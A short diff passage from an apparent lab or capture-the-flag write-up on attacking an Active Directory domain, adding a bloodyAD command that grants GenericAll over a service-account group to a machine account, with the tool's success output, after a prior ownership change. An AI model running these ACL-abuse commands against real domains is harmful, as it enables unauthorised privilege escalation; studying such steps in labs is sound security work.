@@ -897,5 +897,9 @@ bloodyAD --host dc01.trask.hsm -d trask.hsm -k set owner 'CN=Sentinel Service Ac
 First ill take ownership
 
 ```python
+bloodyAD --host dc01.trask.hsm -d trask.hsm -k add genericAll 'CN=Sentinel Service Account Readers,OU=Sentinels,DC=trask,DC=hsm' 'CN=SENTINEL-5TAINB,OU=SENTINELS,DC=TRASK,DC=HSM'
 
+[+] CN=SENTINEL-5TAINB,OU=SENTINELS,DC=TRASK,DC=HSM has now GenericAll on CN=Sentinel Service Account Readers,OU=Sentinels,DC=trask,DC=hsm
 ```
+
+Then ill add full control 
